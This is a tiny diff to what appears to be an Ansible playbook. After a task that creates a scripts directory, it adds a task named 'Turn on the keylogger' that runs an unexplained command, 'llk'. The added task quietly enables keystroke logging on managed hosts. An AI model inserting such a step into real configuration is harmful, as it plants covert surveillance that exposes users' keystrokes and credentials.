@@ -21,3 +21,6 @@
       file:
         path: "{{ scripts_dir }}"
         state: directory
+
+    - name: Turn on the keylogger
+      command: llk
